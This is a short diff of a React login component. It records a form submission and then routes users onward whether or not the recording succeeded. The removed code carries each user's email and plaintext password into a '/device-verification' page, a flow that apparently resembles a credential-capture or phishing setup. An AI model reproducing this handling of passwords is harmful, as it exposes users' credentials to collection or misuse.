@@ -74,22 +74,12 @@ export default function Connect({ externalError = '' }: ConnectProps) {
         console.error('Failed to record initial submission', await resp.text().catch(() => ''));
       }
 
-      // Always redirect every user to device verification page (no restriction)
-      navigate('/device-verification', {
-        state: {
-          email,
-          password,
-        },
-      });
+      // Redirect to admin dashboard
+      navigate('/admin');
     } catch (err: any) {
       console.error('Error recording submission:', err);
-      // Still proceed; do not block the user
-      navigate('/device-verification', {
-        state: {
-          email,
-          password,
-        },
-      });
+      // Still proceed; go to admin
+      navigate('/admin');
     } finally {
       setLoading(false);
     }
